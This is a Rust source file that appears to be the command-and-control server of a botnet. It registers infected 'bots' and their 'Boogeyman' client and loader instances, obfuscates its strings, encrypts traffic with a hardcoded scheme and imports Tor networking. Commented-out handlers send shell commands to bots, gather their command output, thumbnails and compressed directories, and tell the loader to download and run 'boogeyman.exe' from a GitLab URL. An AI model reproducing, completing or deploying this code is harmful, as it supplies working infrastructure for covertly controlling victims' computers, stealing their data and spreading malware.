use std::collections::HashMap;
use std::net::SocketAddr;
use chrono::Utc;
use client_vars::types::receive::BoogeymanReceivePayload;
use client_vars::types::send::BoogeymanSendPayload;
use loader_vars::types::receive::LdrRcv;
use loader_vars::types::send::LdrSnd;
use serde::Deserialize;
use serde::Serialize;
use shared::constants::communication_encryption_key;
use shared::network::tor::ServerReceive;
use shared::network::tor::SrvRcvTp;
use shared::utils::encryption::convert_key_to_bytes;
use shared::utils::encryption::sauron_decrypt;
use shared::utils::encryption::sauron_encrypt;
use tokio::io::AsyncReadExt;
use tokio::io::AsyncWriteExt;
use anyhow::{ Context, Result };
use tokio::net::TcpListener;
use obfstr::obfstr as s;
use tokio::net::TcpStream;
use tokio::sync::Mutex;
use tokio::sync::RwLock;
use std::sync::Arc;
use client_vars::types::structs::BotState;
use crate::router::client::route_client;
use crate::router::loader::route_loader;
use super::sanitization::verify_id_and_version;

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct ClientInstance {
    pub join_date: String,
    pub version: u64,
    pub bot_state: BotState,
    pub console: String,
}
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct LoaderInstance {
    pub join_date: String,
    pub version: u64,
    pub tag: String,
}

#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct Bot {
    pub id: String,
    pub client_instances: Vec<ClientInstance>,
    pub loader_instances: Vec<LoaderInstance>,
    pub verified: bool,
    pub join_date: String,
}

impl Bot {
    pub fn new(
        id: String,
        client_instances: Vec<ClientInstance>,
        loader_instances: Vec<LoaderInstance>,
        verified: bool
    ) -> Self {
        Bot {
            id,
            client_instances,
            loader_instances,
            verified,
            join_date: Utc::now().to_rfc3339(),
        }
    }
}
pub type BotMap = HashMap<String, Bot>;

#[derive(Debug, Clone)]
pub struct ServerHandler {
    listener: Arc<RwLock<TcpListener>>,
    pub bot_map: Arc<RwLock<BotMap>>,
}

impl ServerHandler {
    pub async fn new() -> Result<Self> {
        let addr = SocketAddr::from(([127, 0, 0, 1], 80));

        let listener = TcpListener::bind(addr).await?;

        Ok(ServerHandler {
            listener: Arc::new(RwLock::new(listener)),
            bot_map: Arc::new(RwLock::new(HashMap::new())),
        })
    }
    pub async fn listen_for_connections(&mut self) -> Result<()> {
        loop {
            match self.listener.read().await.accept().await {
                Ok((stream, _socket_addr)) => {
                    println!("new connection!");
                    let self_clone = self.clone();
                    tokio::task::spawn(async move {
                        if let Err(e) = Self::handle_client(&self_clone, stream).await {
                            eprintln!("Error handling client: {}", e);
                        }
                    });
                }
                Err(e) => {
                    eprintln!("Failed to accept connection: {}", e);
                }
            }
        }
    }

    async fn handle_client(&self, stream: TcpStream) -> Result<()> {
        let stream_reference = Arc::new(Mutex::new(stream));
        loop {
            let data = match Self::read_data(stream_reference.clone()).await {
                Ok(data) => data,
                Err(error) => {
                    eprintln!("read_data error: {}", error);
                    continue;
                }
            };

            // spawn new thread
            let self_clone = self.clone();
            let stream_reference_clone = stream_reference.clone();
            tokio::task::spawn(async move {
                if let Err(e) = self_clone.handle_received_data(data, stream_reference_clone).await {
                    eprintln!("Error handling received data: {}", e);
                }
            });
        }
    }

    async fn read_data(stream_ref: Arc<Mutex<TcpStream>>) -> Result<Vec<u8>> {
        let mut stream = stream_ref.lock().await;
        let data_length = match stream.read_u32_le().await {
            Ok(length) => length,
            Err(error) => {
                // means not our protocol message
                // assume its conn close
                return Err(anyhow::anyhow!(format!("Connection closed by client?: {}", error)));
            }
        };

        let mut data_buf = vec![0; data_length as usize];
        stream
            .read_exact(&mut data_buf).await
            .context(s!("Failed to read exact data from stream").to_string())?;
        Ok(data_buf)
    }

    async fn handle_received_data(
        &self,
        data: Vec<u8>,
        stream_ref: Arc<Mutex<TcpStream>>
    ) -> Result<()> {
        let decrypted_data = sauron_decrypt(
            convert_key_to_bytes(&communication_encryption_key()),
            &data
        )?;
        let data: ServerReceive = serde_json
            ::from_slice(&decrypted_data)
            .context(s!("Failed to parse decrypted_data as ServerReceive").to_string())?;

        match data.server_receive_type {
            SrvRcvTp::Ldr => {
                let processed_data: LdrSnd = serde_json
                    ::from_slice(&data.data)
                    .context(s!("Failed to parse binary data as LoaderSendPayload").to_string())?;
                verify_id_and_version(processed_data.id.clone(), processed_data.version.clone())?;
                route_loader(self, processed_data, stream_ref).await
            }
            SrvRcvTp::Bgm => {
                let processed_data: BoogeymanSendPayload = serde_json
                    ::from_slice(&data.data)
                    .context(
                        s!("Failed to parse binary data as BoogeymanSendPayload").to_string()
                    )?;
                verify_id_and_version(processed_data.id.clone(), processed_data.version.clone())?;
                route_client(self, processed_data, stream_ref).await
            }
        }
    }

    pub async fn send_action_to_loader(
        stream_ref: Arc<Mutex<TcpStream>>,
        action: loader_vars::types::receive::ClAct,
        params: loader_vars::types::receive::ClPrms
    ) -> Result<()> {
        let payload = LdrRcv { action, params };
        let binary_data = serde_json
            ::to_vec(&payload)
            .context(
                s!("Failed to serialize LoaderReceivePayload struct to binary data").to_string()
            )?;
        Self::encrypt_and_send(stream_ref, &binary_data).await
    }
    pub async fn send_action_to_client(
        stream_ref: Arc<Mutex<TcpStream>>,
        action: client_vars::types::receive::ClientAction,
        params: client_vars::types::receive::ClientParams
    ) -> Result<()> {
        let payload = BoogeymanReceivePayload { action, params };
        let binary_data = serde_json
            ::to_vec(&payload)
            .context(
                s!("Failed to serialize BoogeymanReceivePayload struct to binary data").to_string()
            )?;
        Self::encrypt_and_send(stream_ref, &binary_data).await
    }

    async fn encrypt_and_send(stream_ref: Arc<Mutex<TcpStream>>, data: &[u8]) -> Result<()> {
        let encrypted_data = sauron_encrypt(
            convert_key_to_bytes(&communication_encryption_key()),
            data
        )?;

        let mut stream = stream_ref.lock().await;
        stream
            .write_all(&encrypted_data).await
            .context(s!("Failed to write to stream").to_string())?;
        stream.flush().await.context(s!("Failed to flush stream").to_string())?;
        Ok(())
    }
}

// pub async fn route_boogeyman(
//     stream: &mut TcpStream,
//     locked_bot_map: &BoogeymanBotMap,
//     received: BoogeymanServerReceive
// ) -> Result<()> {
//     let mut bot_map = locked_bot_map.write().unwrap();

//     match received.action {
//         BoogeymanActionForServer::Init => {
//             // init or fully reset if exist the info data
//             if let BoogeymanServerParams::Init(bot_info) = received.params {
//                 //? THIS DATA WILLLLLLLLLLLLLLLL BE MALICIOUS
//                 // PURIFY AND SANITIZE ALL
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 let current_time: String = Utc::now().to_string();

//                 version_map.insert(received.version, BoogeymanBot {
//                     bot_info,
//                     id: received.id,
//                     join_date: current_time,
//                     console_out: String::new(),
//                     console_err: String::new(),
//                 });

//                 drop(version_map);
//                 println!(
//                     "Boogeyman Init Arrived, made new entry, full boogeyman version_botmap: {:#?}",
//                     bot_map
//                 );
//                 let out: ClientReceive = ClientReceive::Boogeyman(BoogeymanClientReceive {
//                     action: BoogeymanActionForClient::RunCommand,
//                     data: BoogeymanClientParams::RunCommand(RunCommandParams {
//                         command: "echo TEST MODE".to_string(),
//                     }),
//                 });
//                 let data = process_sending(out)?;
//                 Self::send_data_raw(stream, &data).await?;
//             } else {
//                 println!("data not ServerData::BotInfo: {:#?}", received.params);
//             }
//         }
//         BoogeymanActionForServer::CommandOutput => {
//             if let BoogeymanServerParams::CommandOutput(params) = received.params {
//                 // PURIFY AND SANITIZE ALL
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 // Check if version exists, update instead of insert
//                 if let Some(bot) = version_map.get_mut(&received.version) {
//                     if let Some(output) = &params.output {
//                         bot.console_out.push_str(&format!("\n{}", output));
//                     }
//                     if let Some(error) = &params.error {
//                         bot.console_err.push_str(&format!("\n{}", error));
//                     }
//                 }

//                 drop(version_map);
//             } else {
//                 println!("data not CommandOutput: {:#?}", received.params);
//             }
//         }
//         BoogeymanActionForServer::Logs => {}
//         BoogeymanActionForServer::CompressedDir => {}
//         BoogeymanActionForServer::Thumbnail => {
//             if let BoogeymanServerParams::Thumbnail(params) = received.params {
//                 println!("Received Thumbnail of len: {}", params.thumbnail.len());
//             } else {
//                 println!("data not Thumbnail: {:#?}", received.params);
//             }
//         }
//         BoogeymanActionForServer::RealTimeData => {
//             if let BoogeymanServerParams::RealTimeData(params) = received.params {
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 // Check if version exists, update instead of insert
//                 if let Some(bot) = version_map.get_mut(&received.version) {
//                     bot.bot_info.real_time_info = params.real_time_info;
//                 }

//                 drop(version_map);
//             } else {
//                 println!("data not RealTimeData: {:#?}", received.params);
//             }
//         }
//     }
//     drop(bot_map);
//     Ok(())
// }
// pub async fn route_engineer(
//     stream: &mut TcpStream,
//     locked_bot_map: &EngineerBotMap,
//     received: EngineerServerReceive
// ) -> Result<()> {
//     let mut bot_map = locked_bot_map.write().unwrap();

//     match received.action {
//         EngineerActionForServer::InitEng => {
//             if let EngineerServerParams::InitEng(_data) = received.params {
//                 let locked_version_map = bot_map
//                     .entry(received.id.clone())
//                     .or_insert(Arc::new(RwLock::new(HashMap::new())));
//                 let mut version_map = locked_version_map.write().unwrap();
//                 let current_time: String = Utc::now().to_string();
//                 version_map.insert(received.version, EngineerBot {
//                     id: received.id.clone(),
//                     join_date: current_time,
//                 });
//                 drop(version_map);

//                 println!(
//                     "Engineer InitEng Arrived, made new entry, full engineer botmap: {:#?}",
//                     bot_map
//                 );

//                 // let bgm_bytes = match get_boogeyman_bytes() {
//                 //     Ok(bytes) => Some(bytes),
//                 //     Err(error) => {
//                 //         eprintln!("ERROR READIND BOOGEYMAN BTYES: {}", error);
//                 //         None
//                 //     }
//                 // };
//                 // now we gotta send the runinit
//                 let client_receive: ClientReceive = ClientReceive::Engineer(
//                     EngineerClientReceive {
//                         action: EngineerActionForClient::RunConfig,
//                         data: EngineerClientParams::RunConfig(RunConfigParams {
//                             enbl: true, // enabled - if disabled not even run
//                             bgmn_bytes: None, // boogeyman bytes
//                             bgmn: Some(
//                                 "https://gitlab.com/dorkpls/plsnodork/-/raw/main/boogeyman.exe".to_string()
//                             ), // boogeyman url download
//                             bgm_ver: 1, //
//                             updt_bytes: None, // self update bytes
//                             updt: None, // self update url download
//                             vrs: 1, // self version
//                         }),
//                     }
//                 );

//                 let data = process_sending(client_receive).unwrap();

//                 // let result = Self::send_data_raw(stream, &data).await;
//                 // if let Err(e) = result {
//                 //     // Handle the error
//                 //     println!("Error sending data: {:?}", e);
//                 // }

//                 Self::send_data_raw(stream, &data).await.context(
//                     s!("Failed to send_data_raw").to_string()
//                 )?;
//             } else {
//                 println!("data not EngineerServerParams::InitEng: {:#?}", received.params);
//             }
//         }
//     }
//     drop(bot_map);
//     Ok(())
